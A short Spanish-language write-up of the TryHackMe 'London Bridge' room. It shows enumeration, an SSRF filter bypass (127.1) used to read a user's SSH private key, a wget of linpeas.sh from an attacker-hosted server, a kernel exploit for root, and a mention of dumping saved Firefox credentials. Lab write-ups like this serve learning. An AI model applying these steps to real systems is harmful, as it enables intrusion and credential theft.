# The London Bridge - TryHackMe
**IP:** 10.10.154.180

## Enumeración
```bash
sudo nmap -sC -sV 10.10.154.180 -oN nmap
wfuzz -c -L -t 400 --sc=200,301 -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt http://<ip>:8080/FUZZ
```
App "DejaView" con el endpoint `/view_image`.

## Foothold - SSRF
En `/view_image` cambiamos el método a POST (Burp) y fuzzeamos el nombre del parámetro:
```bash
ffuf -w burp-parameter-names.txt -X POST -u http://<ip>:8080/view_image \
  -H "Content-Type: application/x-www-form-urlencoded" -d "FUZZ=/uploads/04.jpg" -fw 226
# parámetro válido: www
```
`localhost` / `127.0.0.1` devuelven 403, pero `127.1:80` bypassea el filtro (SSRF → lectura de archivos internos). Leemos la clave SSH:
```
http://127.1/.ssh/id_rsa
http://127.1/.ssh/authorized_keys   # usuario: beth
```
```bash
ssh -i id_rsa beth@10.10.154.180
```

## Escalada - kernel exploit
```bash
python3 -m http.server 8081          # atacante
wget http://<mi_ip>:8081/linpeas.sh  # víctima
```
LinPEAS marca un kernel vulnerable; compilamos y ejecutamos el exploit para obtener root.
```bash
find / -name root.txt 2>/dev/null
```

> Extra: se pueden dumpear las credenciales guardadas del perfil de Firefox del usuario.
